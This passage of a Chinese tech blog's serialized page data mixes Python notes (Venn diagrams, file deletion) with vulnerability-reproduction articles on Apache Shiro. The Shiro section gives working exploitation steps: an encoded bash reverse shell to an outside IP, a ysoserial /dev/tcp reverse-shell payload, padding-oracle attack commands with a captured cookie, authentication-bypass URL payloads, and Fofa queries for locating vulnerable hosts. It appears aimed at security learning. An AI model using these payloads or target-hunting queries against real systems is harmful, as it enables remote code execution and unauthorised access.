Ab：包含A，但不包含B，即A中非B的部分，A∩¬BA∩¬B\n> \n> aB：包含B，但不包含A，即B中非A，B∩¬AB∩¬A\n> \n> AB：既包含A，又包含B，即A与B的交集，A∩B\n\nfrom matplotlib_venn import venn2, venn2_circles\nvenn2(subsets=(3, 2, 1), set_labels=('A', 'B'))\nvenn2([set(['A', 'B', 'C', 'D']), set(['D', 'E', 'F'])]) \n\n\n1\n2\n3\n\n\n\n\n\n\nvenn3的绘制方法有一点区别，首先需要熟悉韦恩图各个圆圈的位置或者是代称，如三者的交集，当需要更改这个圆圈的颜色或者字体时，需要使用111。\n\n\n\n通过下面的代码我们成功绘制了一个三个数据集的交集\n\n\n\n\n\n或者说，你直接输入交集的数字直接画图。\n\nfrom matplotlib import pyplot as plt\nimport numpy as np\nfrom matplotlib_venn import venn3, venn3_circles\nplt.figure(figsize=(4,4))\nv = venn3(subsets=(2307,382,1409,333,556,120,4774),set_labels = ('A', 'B', 'C'))\nplt.show() \n\n\n1\n2\n3\n4\n5\n6\n\n\n",normalizedContent:"> 摘自：https://www.jianshu.com/p/25b0dc441247\n\n\n# 正文\n\n使用python绘制韦恩图\n\n\n# 下载\n\neasy_install matplotlib-venn \n\n\n1\n\n\n韦恩图依赖于以下的包：\n\n * numpy\n * scipy\n * matplotlib\n\n\n# 使用\n\nmatplotlib-venn 包提供了四个主要的函数：venn2、venn2-circles、venn3 和 venn3-circles。\n\nvenn2和venn2_circles接受一个3元素（ab，ab，ab）构成的 tuple 作为各个子集所包含元素的个数（不是具体的元素）：\n\n> ab：包含a，但不包含b，即a中非b的部分，a∩¬ba∩¬b\n> \n> ab：包含b，但不包含a，即b中非a，b∩¬ab∩¬a\n> \n> ab：既包含a，又包含b，即a与b的交集，a∩b\n\nfrom matplotlib_venn import venn2, venn2_circles\nvenn2(subsets=(3, 2, 1), set_labels=('a', 'b'))\nvenn2([set(['a', 'b', 'c', 'd']), set(['d', 'e', 'f'])]) \n\n\n1\n2\n3\n\n\n\n\n\n\nvenn3的绘制方法有一点区别，首先需要熟悉韦恩图各个圆圈的位置或者是代称，如三者的交集，当需要更改这个圆圈的颜色或者字体时，需要使用111。\n\n\n\n通过下面的代码我们成功绘制了一个三个数据集的交集\n\n\n\n\n\n或者说，你直接输入交集的数字直接画图。\n\nfrom matplotlib import pyplot as plt\nimport numpy as np\nfrom matplotlib_venn import venn3, venn3_circles\nplt.figure(figsize=(4,4))\nv = venn3(subsets=(2307,382,1409,333,556,120,4774),set_labels = ('a', 'b', 'c'))\nplt.show() \n\n\n1\n2\n3\n4\n5\n6\n\n\n",charsets:{cjk:!0},lastUpdated:"2022/04/17, 22:54:59",lastUpdatedTimestamp:1650207299e3},{title:"python删除文件",frontmatter:{title:"python删除文件",date:"2022-04-17T17:48:54.000Z",permalink:"/pages/1a164c/",categories:["Python"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/02.Python/05.python%E5%88%A0%E9%99%A4%E6%96%87%E4%BB%B6.html",relativePath:"02.Python/05.python删除文件.md",key:"v-2c25e620",path:"/pages/1a164c/",headersStr:null,content:"os.remove函数会报错没有权限 使用shutil\n\nimport shutil\nshutil.rmtree(location)\n\n\n1\n2\n",normalizedContent:"os.remove函数会报错没有权限 使用shutil\n\nimport shutil\nshutil.rmtree(location)\n\n\n1\n2\n",charsets:{cjk:!0},lastUpdated:"2022/04/17, 22:54:59",lastUpdatedTimestamp:1650207299e3},{title:"目录",frontmatter:{pageComponent:{name:"Catalogue",data:{path:"02.Python",imgUrl:"/img/catalog.png",description:"python学习"}},title:"目录",date:"2022-04-17T21:48:12.000Z",permalink:"/python/",sidebar:!0,article:!1,comment:!1,editLink:!1,author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/02.Python/catalog.html",relativePath:"02.Python/catalog.md",key:"v-69989b25",path:"/python/",headersStr:null,content:"",normalizedContent:"",charsets:{},lastUpdated:"2022/04/17, 22:54:59",lastUpdatedTimestamp:1650207299e3},{title:"Apache Shiro系列漏洞利用以及实战总结",frontmatter:{title:"Apache Shiro系列漏洞利用以及实战总结",date:"2022-04-17T17:48:54.000Z",permalink:"/pages/111aef/",categories:["安全","漏洞复现"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/03.%E5%AE%89%E5%85%A8/01.%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/01.Apache%20Shiro%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%BB%A5%E5%8F%8A%E5%AE%9E%E6%88%98%E6%80%BB%E7%BB%93.html",relativePath:"03.安全/01.漏洞复现/01.Apache Shiro系列漏洞利用以及实战总结.md",key:"v-3addfbd3",path:"/pages/111aef/",headers:[{level:2,title:"前言：",slug:"前言",normalizedTitle:"前言：",charIndex:66},{level:2,title:"RememberMe RCE-550（CVE-2016-4437）",slug:"rememberme-rce-550-cve-2016-4437",normalizedTitle:"rememberme rce-550（cve-2016-4437）",charIndex:247},{level:2,title:"远程安全限制绕过漏洞（CVE-2016-6802）",slug:"远程安全限制绕过漏洞-cve-2016-6802",normalizedTitle:"远程安全限制绕过漏洞（cve-2016-6802）",charIndex:1355},{level:2,title:"Padding Oracle Attack RCE-721（CVE-2019-12422）",slug:"padding-oracle-attack-rce-721-cve-2019-12422",normalizedTitle:"padding oracle attack rce-721（cve-2019-12422）",charIndex:1634},{level:2,title:"Shiro搭配spring时身份验证绕过漏洞分析（CVE-2020-1957）**",slug:"shiro搭配spring时身份验证绕过漏洞分析-cve-2020-1957",normalizedTitle:"shiro搭配spring时身份验证绕过漏洞分析（cve-2020-1957）**",charIndex:4055},{level:2,title:"Apache Shiro 628权限绕过漏洞 （CVE-2020-2957）",slug:"apache-shiro-628权限绕过漏洞-cve-2020-2957",normalizedTitle:"apache shiro 628权限绕过漏洞 （cve-2020-2957）",charIndex:4427},{level:2,title:"Apache Shiro权限绕过漏洞分析(CVE-2020-11989)",slug:"apache-shiro权限绕过漏洞分析-cve-2020-11989",normalizedTitle:"apache shiro权限绕过漏洞分析(cve-2020-11989)",charIndex:4700},{level:2,title:"Apache Shiro 权限绕过漏洞（CVE-2020-13933）",slug:"apache-shiro-权限绕过漏洞-cve-2020-13933",normalizedTitle:"apache shiro 权限绕过漏洞（cve-2020-13933）",charIndex:4940},{level:2,title:"总结",slug:"总结",normalizedTitle:"总结",charIndex:5193},{level:3,title:"1、Shiro指纹识别",slug:"_1、shiro指纹识别",normalizedTitle:"1、shiro指纹识别",charIndex:5292},{level:3,title:"2、资产收集",slug:"_2、资产收集",normalizedTitle:"2、资产收集",charIndex:5372}],headersStr:"前言： RememberMe RCE-550（CVE-2016-4437） 远程安全限制绕过漏洞（CVE-2016-6802） Padding Oracle Attack RCE-721（CVE-2019-12422） Shiro搭配spring时身份验证绕过漏洞分析（CVE-2020-1957）** Apache Shiro 628权限绕过漏洞 （CVE-2020-2957） Apache Shiro权限绕过漏洞分析(CVE-2020-11989) Apache Shiro 权限绕过漏洞（CVE-2020-13933） 总结 1、Shiro指纹识别 2、资产收集",content:'> https://blog.csdn.net/qq_41832837/article/details/109064636\n\n\n# 前言：\n\nApache Shiro是一个强大且易用的Java安全框架,执行身份验证、授权、密码和会话管理。使用Shiro的易于理解的API,可以快速、轻松地获得任何应用程序,从最小的移动应用程序到最大的网络和企业应用程序。内置了可以连接大量安全数据源（又名目录）的Realm，如LDAP、关系数据库（JDBC）、类似INI的文本配置资源以及属性文件等。\n\n\n# RememberMe RCE-550（CVE-2016-4437）\n\n漏洞详情：\n\nApache Shiro框架提供了记住我（RememberMe）的功能，关闭浏览器再次访问时无需再登录即可访问。shiro默认使用CookieRememberMeManager，对rememberMe的cookie做了加密处理，在CookieRememberMeManaer类中将cookie中rememberMe字段内容先后进行序列化、AES加密、Base64编码操作。服务器端识别身份解密处理cookie的流程则是：\n\n获取rememberMe cookie****-********>base64 解码->AES解密（加密密钥硬编码）->反序列化（未作过滤处理）。但是AES加密的密钥Key被硬编码(密钥初始就被定义好不能动态改变的)在代码里，这就意味着每个人通过源代码都能拿到AES加密的密钥。因此，攻击者可以构造一个恶意的对象，并且对其序列化、AES加密、base64编码后，作为cookie的rememberMe字段发送。Shiro将rememberMe进行解密并且反序列化，最终就造成了反序列化的RCE漏洞。只要rememberMe的AES加密密钥泄露，无论shiro是什么版本都可能会导致该漏洞的产生.硬编码是将数据直接嵌入到程序或其他可执行对象的源代码中。如果在返回包的 Set-Cookie**** 中存在 rememberMe=deleteMe 字段，那么就可能存在此漏洞。\n\n漏洞影响：\n\nApache Shiro <= 1.2.4\n\n漏洞利用：\n\n 1. 访问存在漏洞的网站，勾选Remenber me，输入账号：admin密码：123456\n 2. 提交表单的同时进行抓包，返回包中存在Set-Cookie********: rememberMe=deleteMe\n\n\n\n3.将反弹shell命令放到 http://www.jackson-t.ca/runtime-exec-payloads.html 进行编码转换\n\n\n\n4.nc监听4444端口\n\nnc -lvpp 4444\n\n5.使用shiro_exp.py执行bash反弹shell命令\n\npython2 .\\exp.py -t 3 -u http://xx.xx.xx.xx:8080/login -p \' bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8yNy4xNTUuODcuODkvMzI0NjAgMD4mMQ==}|{base64,-d}|{bash,-i}\'\n\n\n\n反弹shell成功\n\n\n\n\n# 远程安全限制绕过漏洞（CVE-2016-6802）\n\n漏洞详情\n\nshiro在路径控制的时候，未能对传入的url编码进行decode解码，导致攻击者可以绕过过滤器，访问被过滤的路径。\n\n漏洞影响\n\nshrio <1.3.2\n\n漏洞利用\n\n访问http://127.0.0.1/admin 的时候，页面返回403。因此可以确定admin路径是属于被过滤路径。此时使用burp截断，然后在访问路径的最后添加%2f，既可绕过shiro检测。因为对于浏览器来说%2f会被自动编码为/，但是burp截断之后进入shiro，shiro未对其解码，所以可以绕过。\n\n\n# Padding Oracle Attack RCE-721（CVE-2019-12422）\n\n漏洞简介\n\nApache Shiro 存在高危代码执行漏洞。该漏洞是由于Apache Shiro cookie中通过 AES-128-CBC 模式加密的rememberMe字段存在问题，用户可通过Padding Oracle 加密生成的攻击代码来构造恶意的rememberMe字段，并重新请求网站，进行反序列化攻击，最终导致任意代码执行。\n\n环境搭建\n\ngit clone https://github.com/3ndz/Shiro-721.git\n\ncd Shiro-721/Docker\n\ndocker build -t shiro-721 .\n\ndocker run -p 8080:8080 -d shiro-721\n\n影响版本\n\nApache Shiro 1.2.5, 1.2.6, 1.3.0, 1.3.1, 1.3.2, 1.4.0-RC2, 1.4.0, 1.4.1\n\n漏洞分析\n\n总体来说就是shrio中的remenberme cookie字段是采用AES-128-CBC加密的，因此容易受到oracle填充攻击，攻击者可以采用有效的cookie字段来作为padding oracle attack的前缀，然后精心构造反序列化字段进行命令执行。\n\n漏洞利用\n\n 1. 我们利用的前提是，需要能够获取正常的remenberMe的cookie，所以我们需要进入后台，获取正常的cookie：\n\n\n\n先用ysoserial生成反序列化payload\n\ngithub项目地址：https://github.com/frohoff/ysoserial\n\n2、执行ysoserial.jar\n\njava -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsBeanutils1 bash -i >& /dev/tcp/xx.xx.xx.xx/4444 0>&1\' > linux_shell.class\n\n\n1\n\n\n使用PaddingOracleAttack-1.0-SNAPSHOT.jar 进行漏洞利用\n\ngithub项目地址：https://github.com/longofo/PaddingOracleAttack-Shiro-721\n\n3、执行PaddingOracleAttack.jar\n\njava -jar PaddingOracleAttack-1.0-SNAPSHOT.jar http://xx.xx.xx.xx:8080/ CVLt9Uxe8Y+wYtBAg8OqeYytEKI04csCy916LpA8ndWPk0GHmv7iFB8nZIsnZmS00MLpOgHQD3+KRUlVQA09b7HFgios2tfD3ja6dKwoE4n4Y6h6tX2oZMwedIpmIBp59a6V8qqSk9chl1epO9up3ZJKrvQLs6CgRoA10Q4ZK0Jy00DQmFWWAvNI22tf4P68R/i2jOSSZ3+0KXme04jIWbYjcY7jVtD8RqehLDjHVxARWp8LVROQhHov2Gk2pEbXQs5MTF7sw1Nf6gcP6B1JizNWNvy23D0QVlGCqwu3qvwDaC2WUZm87DUr3fsOY6yOaDBk/Gpx1G6RJHN8LHJQ8zJVUfPJTX156B2ABq00xtCrXxjOWQpDVCrqjRoNHZ3qYVDITv7k/1Tmmwgayjv8F5nWLP+feY+oKIjt+eW5JVs0Ky2hbjDHin8KefdcuA+wK34NFyIbZi0abIjhKmqval5h/IjE6xMiGcA3Dsi/cuJGhHp0YbcWYuyxAfVCa15V 16 shell.class\n\n\n1\n\n\n4、得到破解结果后burpsuite重放替换cookie后的数据包，成功反弹shell\n\n使用shiro_exp.py 进行漏洞利用\n\n5、执行shiro_exp.py\n\npython2 shiro_exp.py [http://xx.xx.xx.xx:8080/samples-web-1.4.1/home.jsp](http://39.108.118.128:8080/samples-web-1.4.1/home.jsp) CVLt9Uxe8Y+wYtBAg8OqeYytEKI04csCy916LpA8ndWPk0GHmv7iFB8nZIsnZmS00MLpOgHQD3+KRUlVQA09b7HFgios2tfD3ja6dKwoE4n4Y6h6tX2oZMwedIpmIBp59a6V8qqSk9chl1epO9up3ZJKrvQLs6CgRoA10Q4ZK0Jy00DQmFWWAvNI22tf4P68R/i2jOSSZ3+0KXme04jIWbYjcY7jVtD8RqehLDjHVxARWp8LVROQhHov2Gk2pEbXQs5MTF7sw1Nf6gcP6B1JizNWNvy23D0QVlGCqwu3qvwDaC2WUZm87DUr3fsOY6yOaDBk/Gpx1G6RJHN8LHJQ8zJVUfPJTX156B2ABq00xtCrXxjOWQpDVCrqjRoNHZ3qYVDITv7k/1Tmmwgayjv8F5nWLP+feY+oKIjt+eW5JVs0Ky2hbjDHin8KefdcuA+wK34NFyIbZi0abIjhKmqval5h/IjE6xMiGcA3Dsi/cuJGhHp0YbcWYuyxAfVCa15V shell.class\n\n\n1\n\n\n6、经过漫长的时间后得到cookie，然后替代刚抓包的cookie，重放即可\n\n\n\n\n\n\n# Shiro搭配spring时身份验证绕过漏洞分析（CVE-2020-1957）**\n\n漏洞详情\n\n在Shiro中的URL路径表达式pathPattern可以正确匹配/resource/menus，但不能正确匹配/resource/menus/，导致过滤链无法正确匹配，从而绕Shiro的防护机制。当Shiro 的Ant格式的pathPattern 中的的*通配符是不支持匹配路径的，所以/hello/*不能成功匹配/hello/1/，也就不会触发authc拦截器进行权限拦截。从而成功绕过了Shiro拦截器，而后再进入到spring拦截器中，/hello/1/与/hello/1能获取到相同的资源。\n\n影响版本\n\nShiro <1.5.2\n\n漏洞分析\n\nhttps://www.freebuf.com/vuls/231909.html\n\n\n# Apache Shiro 628权限绕过漏洞 （CVE-2020-2957）\n\n漏洞详情\n\nCVE-2020-195身份认证绕过漏洞，可以用/hello/1/来绕过登录验证，此次漏洞在之前CVE-2020-1957补丁的基础上进行绕过，访问/hello/1/会进入登录认证，但是通过构造payload: /fdsf;/../hello/1 可以绕过登录认证。\n\n影响版本\n\nShiro <=1.5.1\n\n漏洞分析\n\nhttps://www.rednn.com/safe/202003/30176.html CVE-2020-2957复现\n\n\n# Apache Shiro权限绕过漏洞分析(CVE-2020-11989)\n\n漏洞详情\n\n如果直接访问 /test/admin/page ，会返回302跳转要求登录，\n\n访问 /;/test/admin/page , 就能直接绕过Shiro权限验证，访问到/admin路由中的信息\n\n漏洞版本\n\nShiro < 1.5.3\n\nSping框架只使用shiro鉴权\n\n漏洞分析\n\nhttps://xz.aliyun.com/t/7964 CVE-2020-11989 漏洞复现\n\n\n# Apache Shiro 权限绕过漏洞（CVE-2020-13933）\n\n漏洞详情\n\nApache Shiro的CVE-2020-11989修补补丁依旧存在缺陷，由于shiro和spring在处理url中仍然存在差别，通过构造特殊的HTTP请求，可以再次绕过授权，访问未授权的信息。访问/read/xx，被302重定向到了/login, 而访问/read/%3bxxx，能够绕过认证。\n\n漏洞版本\n\nShiro<1.6.0\n\n漏洞分析\n\nhttps://xz.aliyun.com/t/8230/\n\n\n# 总结\n\n目前来说Shiro危害比较大的就两个RCE漏洞，721漏洞的爆破速度太慢了，且成功率比较低。550漏洞相对来说比较好利用，但是漏洞数量已经很少了，可能某些内网比较老的机子还存在着。\n\n\n# 1、Shiro指纹识别\n\n已知指纹：\n\n若依CMS、TIMO后台管理系统\n\nBp抓包：\n\n在登陆界面勾线记住密码，进行抓包，找remeberMe字段。\n\n\n# 2、资产收集\n\nFofa语法：\n\n"shiro" &&"管理系统"\n\nheader="rememberme=deleteMe"、header="shiroCookie"',normalizedContent:'> https://blog.csdn.net/qq_41832837/article/details/109064636\n\n\n# 前言：\n\napache shiro是一个强大且易用的java安全框架,执行身份验证、授权、密码和会话管理。使用shiro的易于理解的api,可以快速、轻松地获得任何应用程序,从最小的移动应用程序到最大的网络和企业应用程序。内置了可以连接大量安全数据源（又名目录）的realm，如ldap、关系数据库（jdbc）、类似ini的文本配置资源以及属性文件等。\n\n\n# rememberme rce-550（cve-2016-4437）\n\n漏洞详情：\n\napache shiro框架提供了记住我（rememberme）的功能，关闭浏览器再次访问时无需再登录即可访问。shiro默认使用cookieremembermemanager，对rememberme的cookie做了加密处理，在cookieremembermemanaer类中将cookie中rememberme字段内容先后进行序列化、aes加密、base64编码操作。服务器端识别身份解密处理cookie的流程则是：\n\n获取rememberme cookie****-********>base64 解码->aes解密（加密密钥硬编码）->反序列化（未作过滤处理）。但是aes加密的密钥key被硬编码(密钥初始就被定义好不能动态改变的)在代码里，这就意味着每个人通过源代码都能拿到aes加密的密钥。因此，攻击者可以构造一个恶意的对象，并且对其序列化、aes加密、base64编码后，作为cookie的rememberme字段发送。shiro将rememberme进行解密并且反序列化，最终就造成了反序列化的rce漏洞。只要rememberme的aes加密密钥泄露，无论shiro是什么版本都可能会导致该漏洞的产生.硬编码是将数据直接嵌入到程序或其他可执行对象的源代码中。如果在返回包的 set-cookie**** 中存在 rememberme=deleteme 字段，那么就可能存在此漏洞。\n\n漏洞影响：\n\napache shiro <= 1.2.4\n\n漏洞利用：\n\n 1. 访问存在漏洞的网站，勾选remenber me，输入账号：admin密码：123456\n 2. 提交表单的同时进行抓包，返回包中存在set-cookie********: rememberme=deleteme\n\n\n\n3.将反弹shell命令放到 http://www.jackson-t.ca/runtime-exec-payloads.html 进行编码转换\n\n\n\n4.nc监听4444端口\n\nnc -lvpp 4444\n\n5.使用shiro_exp.py执行bash反弹shell命令\n\npython2 .\\exp.py -t 3 -u http://xx.xx.xx.xx:8080/login -p \' bash -c {echo,ymfzacatasa+jiavzgv2l3rjcc8yny4xntuuodcuodkvmzi0njagmd4mmq==}|{base64,-d}|{bash,-i}\'\n\n\n\n反弹shell成功\n\n\n\n\n# 远程安全限制绕过漏洞（cve-2016-6802）\n\n漏洞详情\n\nshiro在路径控制的时候，未能对传入的url编码进行decode解码，导致攻击者可以绕过过滤器，访问被过滤的路径。\n\n漏洞影响\n\nshrio <1.3.2\n\n漏洞利用\n\n访问http://127.0.0.1/admin 的时候，页面返回403。因此可以确定admin路径是属于被过滤路径。此时使用burp截断，然后在访问路径的最后添加%2f，既可绕过shiro检测。因为对于浏览器来说%2f会被自动编码为/，但是burp截断之后进入shiro，shiro未对其解码，所以可以绕过。\n\n\n# padding oracle attack rce-721（cve-2019-12422）\n\n漏洞简介\n\napache shiro 存在高危代码执行漏洞。该漏洞是由于apache shiro cookie中通过 aes-128-cbc 模式加密的rememberme字段存在问题，用户可通过padding oracle 加密生成的攻击代码来构造恶意的rememberme字段，并重新请求网站，进行反序列化攻击，最终导致任意代码执行。\n\n环境搭建\n\ngit clone https://github.com/3ndz/shiro-721.git\n\ncd shiro-721/docker\n\ndocker build -t shiro-721 .\n\ndocker run -p 8080:8080 -d shiro-721\n\n影响版本\n\napache shiro 1.2.5, 1.2.6, 1.3.0, 1.3.1, 1.3.2, 1.4.0-rc2, 1.4.0, 1.4.1\n\n漏洞分析\n\n总体来说就是shrio中的remenberme cookie字段是采用aes-128-cbc加密的，因此容易受到oracle填充攻击，攻击者可以采用有效的cookie字段来作为padding oracle attack的前缀，然后精心构造反序列化字段进行命令执行。\n\n漏洞利用\n\n 1. 我们利用的前提是，需要能够获取正常的remenberme的cookie，所以我们需要进入后台，获取正常的cookie：\n\n\n\n先用ysoserial生成反序列化payload\n\ngithub项目地址：https://github.com/frohoff/ysoserial\n\n2、执行ysoserial.jar\n\njava -jar ysoserial-0.0.6-snapshot-all.jar commonsbeanutils1 bash -i >& /dev/tcp/xx.xx.xx.xx/4444 0>&1\' > linux_shell.class\n\n\n1\n\n\n使用paddingoracleattack-1.0-snapshot.jar 进行漏洞利用\n\ngithub项目地址：https://github.com/longofo/paddingoracleattack-shiro-721\n\n3、执行paddingoracleattack.jar\n\njava -jar paddingoracleattack-1.0-snapshot.jar http://xx.xx.xx.xx:8080/ cvlt9uxe8y+wytbag8oqeyyteki04cscy916lpa8ndwpk0ghmv7ifb8nzisnzms00mlpoghqd3+krulvqa09b7hfgios2tfd3ja6dkwoe4n4y6h6tx2ozmwedipmibp59a6v8qqsk9chl1epo9up3zjkrvqls6cgroa10q4zk0jy00dqmfwwavni22tf4p68r/i2jossz3+0kxme04jiwbyjcy7jvtd8rqehldjhvxarwp8lvroqhhov2gk2pebxqs5mtf7sw1nf6gcp6b1jiznwnvy23d0qvlgcqwu3qvwdac2wuzm87dur3fsoy6yoadbk/gpx1g6rjhn8lhjq8zjvufpjtx156b2abq00xtcrxxjowqpdvcrqjronhz3qyvditv7k/1tmmwgayjv8f5nwlp+fey+okijt+ew5jvs0ky2hbjdhin8kefdcua+wk34nfyibzi0abijhkmqval5h/ije6xmigca3dsi/cujghhp0ybcwyuyxafvca15v 16 shell.class\n\n\n1\n\n\n4、得到破解结果后burpsuite重放替换cookie后的数据包，成功反弹shell\n\n使用shiro_exp.py 进行漏洞利用\n\n5、执行shiro_exp.py\n\npython2 shiro_exp.py [http://xx.xx.xx.xx:8080/samples-web-1.4.1/home.jsp](http://39.108.118.128:8080/samples-web-1.4.1/home.jsp) cvlt9uxe8y+wytbag8oqeyyteki04cscy916lpa8ndwpk0ghmv7ifb8nzisnzms00mlpoghqd3+krulvqa09b7hfgios2tfd3ja6dkwoe4n4y6h6tx2ozmwedipmibp59a6v8qqsk9chl1epo9up3zjkrvqls6cgroa10q4zk0jy00dqmfwwavni22tf4p68r/i2jossz3+0kxme04jiwbyjcy7jvtd8rqehldjhvxarwp8lvroqhhov2gk2pebxqs5mtf7sw1nf6gcp6b1jiznwnvy23d0qvlgcqwu3qvwdac2wuzm87dur3fsoy6yoadbk/gpx1g6rjhn8lhjq8zjvufpjtx156b2abq00xtcrxxjowqpdvcrqjronhz3qyvditv7k/1tmmwgayjv8f5nwlp+fey+okijt+ew5jvs0ky2hbjdhin8kefdcua+wk34nfyibzi0abijhkmqval5h/ije6xmigca3dsi/cujghhp0ybcwyuyxafvca15v shell.class\n\n\n1\n\n\n6、经过漫长的时间后得到cookie，然后替代刚抓包的cookie，重放即可\n\n\n\n\n\n\n# shiro搭配spring时身份验证绕过漏洞分析（cve-2020-1957）**\n\n漏洞详情\n\n在shiro中的url路径表达式pathpattern可以正确匹配/resource/menus，但不能正确匹配/resource/menus/，导致过滤链无法正确匹配，从而绕shiro的防护机制。当shiro 的ant格式的pathpattern 中的的*通配符是不支持匹配路径的，所以/hello/*不能成功匹配/hello/1/，也就不会触发authc拦截器进行权限拦截。从而成功绕过了shiro拦截器，而后再进入到spring拦截器中，/hello/1/与/hello/1能获取到相同的资源。\n\n影响版本\n\nshiro <1.5.2\n\n漏洞分析\n\nhttps://www.freebuf.com/vuls/231909.html\n\n\n# apache shiro 628权限绕过漏洞 （cve-2020-2957）\n\n漏洞详情\n\ncve-2020-195身份认证绕过漏洞，可以用/hello/1/来绕过登录验证，此次漏洞在之前cve-2020-1957补丁的基础上进行绕过，访问/hello/1/会进入登录认证，但是通过构造payload: /fdsf;/../hello/1 可以绕过登录认证。\n\n影响版本\n\nshiro <=1.5.1\n\n漏洞分析\n\nhttps://www.rednn.com/safe/202003/30176.html cve-2020-2957复现\n\n\n# apache shiro权限绕过漏洞分析(cve-2020-11989)\n\n漏洞详情\n\n如果直接访问 /test/admin/page ，会返回302跳转要求登录，\n\n访问 /;/test/admin/page , 就能直接绕过shiro权限验证，访问到/admin路由中的信息\n\n漏洞版本\n\nshiro < 1.5.3\n\nsping框架只使用shiro鉴权\n\n漏洞分析\n\nhttps://xz.aliyun.com/t/7964 cve-2020-11989 漏洞复现\n\n\n# apache shiro 权限绕过漏洞（cve-2020-13933）\n\n漏洞详情\n\napache shiro的cve-2020-11989修补补丁依旧存在缺陷，由于shiro和spring在处理url中仍然存在差别，通过构造特殊的http请求，可以再次绕过授权，访问未授权的信息。访问/read/xx，被302重定向到了/login, 而访问/read/%3bxxx，能够绕过认证。\n\n漏洞版本\n\nshiro<1.6.0\n\n漏洞分析\n\nhttps://xz.aliyun.com/t/8230/\n\n\n# 总结\n\n目前来说shiro危害比较大的就两个rce漏洞，721漏洞的爆破速度太慢了，且成功率比较低。550漏洞相对来说比较好利用，但是漏洞数量已经很少了，可能某些内网比较老的机子还存在着。\n\n\n# 1、shiro指纹识别\n\n已知指纹：\n\n若依cms、timo后台管理系统\n\nbp抓包：\n\n在登陆界面勾线记住密码，进行抓包，找remeberme字段。\n\n\n# 2、资产收集\n\nfofa语法：\n\n"shiro" &&"管理系统"\n\nheader="rememberme=deleteme"、header="shirocookie"',charsets:{cjk:!0},lastUpdated:"2022/04/17, 22:54:59",lastUpdatedTimestamp:1650207299e3},{title:"CVE-2020-2957复现",frontmatter:{title:"CVE-2020-2957复现",date:"2022-04-17T17:48:54.000Z",permalink:"/pages/b2c493/",categories:["安全","漏洞复现"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/03.%E5%AE%89%E5%85%A8/01.%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/02.CVE-2020-2957%E5%A4%8D%E7%8E%B0.html",relativePath:"03.安全/01.漏洞复现/02.CVE-2020-2957复现.md",key:"v-4750fcf7",path:"/pages/b2c493/",headersStr:null,content:"> Apache Shiro 628权限绕过漏洞 （CVE-2020-2957） 漏洞详情\n> \n> CVE-2020-195身份认证绕过漏洞，可以用/hello/1/来绕过登录验证，此次漏洞在之前CVE-2020-1957补丁的基础上进行绕过，访问/hello/1/会进入登录认证，但是通过构造payload: /fdsf;/../hello/1 可以绕过登录认证。\n> \n> 影响版本\n> \n> Shiro <=1.5.1\n> \n> 漏洞分析\n> \n> https://www.rednn.com/safe/202003/30176.html\n\n> 原理：https://blog.csdn.net/m0_49443776/article/details/114173259\n\n有的教程让我访问/xxx;/../admin/123来跳过 有的教程让我访问/xxx/..;/admin/123 通过上面的介绍 访问 怎么都会返回重定向到登录页面，而且debug的时候获得的路径并不是我原始输入的，百思不得其解\n\n后来发现不是单纯shiro版本的问题 我编写代码的时候使用了springboot，而springboot的版本也会有影响 而shiro-spring-boot-web-starter最终追述过去 对应的版本其实也是shiro 1.5.1\n\n        <dependency>\n            <groupId>org.apache.shiro</groupId>\n            <artifactId>shiro-spring-boot-web-starter</artifactId>\n            <version>1.5.1</version>\n        </dependency>\n\n\n1\n2\n3\n4\n5\n\n\n这个漏洞源自于 shiro和springboot对url解析规则不一致 而新版的springboot的解析是不会出现这个问题的 漏洞无法利用 切换到以前的版本的springboot 漏洞成功复现\n\n不过只有/xxx/..;/admin/123能够被绕过，另一个实际上无法绕过",normalizedContent:"> apache shiro 628权限绕过漏洞 （cve-2020-2957） 漏洞详情\n> \n> cve-2020-195身份认证绕过漏洞，可以用/hello/1/来绕过登录验证，此次漏洞在之前cve-2020-1957补丁的基础上进行绕过，访问/hello/1/会进入登录认证，但是通过构造payload: /fdsf;/../hello/1 可以绕过登录认证。\n> \n> 影响版本\n> \n> shiro <=1.5.1\n> \n> 漏洞分析\n> \n> https://www.rednn.com/safe/202003/30176.html\n\n> 原理：https://blog.csdn.net/m0_49443776/article/details/114173259\n\n有的教程让我访问/xxx;/../admin/123来跳过 有的教程让我访问/xxx/..;/admin/123 通过上面的介绍 访问 怎么都会返回重定向到登录页面，而且debug的时候获得的路径并不是我原始输入的，百思不得其解\n\n后来发现不是单纯shiro版本的问题 我编写代码的时候使用了springboot，而springboot的版本也会有影响 而shiro-spring-boot-web-starter最终追述过去 对应的版本其实也是shiro 1.5.1\n\n        <dependency>\n            <groupid>org.apache.shiro</groupid>\n            <artifactid>shiro-spring-boot-web-starter</artifactid>\n            <version>1.5.1</version>\n        </dependency>\n\n\n1\n2\n3\n4\n5\n\n\n这个漏洞源自于 shiro和springboot对url解析规则不一致 而新版的springboot的解析是不会出现这个问题的 漏洞无法利用 切换到以前的版本的springboot 漏洞成功复现\n\n不过只有/xxx/..;/admin/123能够被绕过，另一个实际上无法绕过",charsets:{cjk:!0},lastUpdated:"2022/04/17, 22:54:59",lastUpdatedTimestamp:1650207299e3},{title:"CVE-2020-11989 漏洞复现",frontmatter:{title:"CVE-2020-11989 漏洞复现",date:"2022-04-17T17:48:54.000Z",permalink:"/pages/294836/",categories:["安全","漏洞复现"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/03.%E5%AE%89%E5%85%A8/01.%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/03.CVE-2020-11989%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0.html",relativePath:"03.安全/01.漏洞复现/03.CVE-2020-11989 漏洞复现.md",key:"v-2fb8fa08",path:"/pages/294836/",headersStr:null,content:'这里的 shiro 拦截器需要设置成map.put("/admin/*", "authc"); 这里有两种poc，都是可以绕过\n\n * admin/a%25%32%66a\n * /;/admin/aaa\n\n第一种情况\n\n> 